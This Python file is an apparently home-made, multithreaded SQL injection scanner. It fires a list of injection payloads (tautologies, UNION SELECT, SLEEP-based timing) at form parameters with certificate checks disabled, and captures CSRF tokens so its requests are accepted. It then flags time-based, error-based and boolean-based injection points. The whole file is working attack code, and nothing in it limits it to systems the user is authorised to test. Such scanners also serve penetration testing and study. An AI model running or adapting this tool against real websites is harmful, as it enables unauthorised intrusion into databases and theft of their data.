import requests
import time
from concurrent.futures import ThreadPoolExecutor
import urllib3
import json
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*"
}



PAYLOADS = [    #payload that we are gonna use to test
    "'","' OR 1=1--", "' OR '1'='1", "admin' --", "admin' #", "' OR 1=1 #",
    "'; SELECT SLEEP(5)--", "') OR 1=1--", "1' ORDER BY 1--", "1' UNION SELECT NULL--"
]



def test(punto, payload, baseline, punti, sessione):

    url = punto["endpoint"]
    metodo = punto["method"].upper()
    param = punto["name"]

   

   

    headorg = punto.get("headers", {}).copy()  
    ct = headorg.get("content-type") or headorg.get("Content-Type") or "application/x-www-form-urlencoded"

   

    

    headers = headorg
    for h in ["Content-Length", "Host", "content-length", "host"]:    
        headers.pop(h, None)

   

    

    headers["Referer"] = url 
    headers.update(sessione.headers)  
    headers["Content-Type"] = ct 



    


   
    alldata = {}

    for p in punti: 
        if p["endpoint"] == url:
            alldata[p["name"]] = "test"

    alldata[param] = payload


    token = sessione.headers.get("X-CSRF-Token") or sessione.headers.get("X-CSRF-TOKEN") 
    if token and "json" in ct.lower():  
        alldata["csrf_token"] = token
        alldata["csrf"] = token


    try:

        st = time.time()  

        if metodo == "GET":  
            res = sessione.get(url, params=alldata, headers=headers, timeout=10, verify=False)  

        else:  

            if "json" in ct.lower():  
                body = json.dumps(alldata).encode("utf-8")
                res = sessione.post(url, data=body, headers=headers, timeout=10, verify=False)

            else:  
                res = sessione.post(url, data=alldata, headers=headers, timeout=10, verify=False)

       

        duration = time.time() - st   


       

        # 1. time-based analysis
        if duration > (baseline + 4.5):  
            scrivi("TIME-BASED", param, url, payload, ct)
            return


        # 2. error-based analysis
        errors = ["sql syntax", "pymysql", "programmingerror", "syntax error", "mysql.connector", "internal server error"]

        answer = res.text.lower()

       
        for i in errors:
            if i in answer:
                scrivi("ERROR-BASED", param, url, payload, ct)
                return



        # 3. boolean analysis

        isbool = False
        for p in ["OR", "AND", "SELECT", "UNION", "CASE"]:  
            if p in payload.upper():
                isbool = True
                break

        if res.status_code in [200, 302] and isbool:
            
            false = alldata.copy()
            false[param] = "' OR 1=2--"  

            if metodo == "GET":
                rf = sessione.get(url, params=false, headers=headers, timeout=10, verify=False)

            else:
               
                if "json" in ct.lower():
                    bfalse = json.dumps(false).encode("utf-8")
                    rf = sessione.post(url, data=bfalse, headers=headers, timeout=10, verify=False)

                else:
                    rf = sessione.post(url, data=false, headers=headers, timeout=10, verify=False)


            if rf.status_code != res.status_code or len(rf.text) != len(res.text):  
                scrivi("BOOLEAN-DIFF", param, url, payload, ct)
                return


    except Exception as e:

        print(f"[!] error on {param}: {e}")





def get_csrf(target):

    session = requests.Session()

   

    burl = "/".join(target.split("/")[:3]) 
   
    try:

        print(f"[*] searching token in cookie on {burl}...")

        r = session.get(burl, headers=BASE_HEADERS, timeout=10, verify=False) 

        ctoken = None
        for i in ["XSRF-TOKEN", "csrftoken", "_csrf", "csrf_token"]: 
            if i in session.cookies:
                ctoken = session.cookies[i]
                break

       

        

        if not ctoken: 

            match = re.search(r'csrf[-_]?token["\' ]?[:=] ["\' ]?([a-zA-Z0-9\-_.]+)["\' ]?', r.text, re.I)

            if match:
                ctoken = match.group(1)



        if ctoken:

            session.headers.update({  
                "X-CSRF-TOKEN": ctoken,
                "X-CSRFToken": ctoken,
                "X-XSRF-TOKEN": ctoken,
                "Referer": burl,
                "Origin": burl
            })

            print("[+] Token captured")

        else:
            print("[!] The server did not send any CSRF cookies. Attempting blind...")

        return session

    except Exception as e:

        print(f"[!] Session error: {e}")

        return session









def scrivi(tipo, param, url, payload, fmt): 

    print(f"\n[!!!] FOUND VULNERABILITY!")
    print(f"    > Type: {tipo}")
    print(f"    > Parameter: {param} ({fmt})")
    print(f"    > URL: {url}")
    print(f"    > Payload: {payload}")
    print("-" * 30)







def start(risultati, mod):

    if not risultati:
        print("[!] No valid access point found"); return


    check = {}
    for p in risultati:  
        chiave = (p["endpoint"], p["name"])
        check[chiave] = p

    unici = list(check.values())


    if mod == 2:   
        url_target = risultati[0]["endpoint"]
        sessione_valida = get_csrf(url_target)

    else:
        sessione_valida = requests.Session()
        sessione_valida.headers.update(BASE_HEADERS)



    

    try:  #calcoliamo una baseline con la sessione appena creata
        t1 = time.time()
        sessione_valida.get(risultati[0]["endpoint"], timeout=5, verify=False)
        baseline = time.time() - t1

    except:
        print("baseline capture failed, using average baseline")
        baseline = 0.5



    print(f"[*] Engine started with mode: {mod} on {len(unici)} target.")
    print(f"[*] Baseline detected: {baseline:.2f}s. Starting thread...")



    with ThreadPoolExecutor(max_workers=7) as ex:   

        for i in unici:   
            for j in PAYLOADS:
                ex.submit(test, i, j, baseline, risultati, sessione_valida) 

    print("\n[*] Scan ended")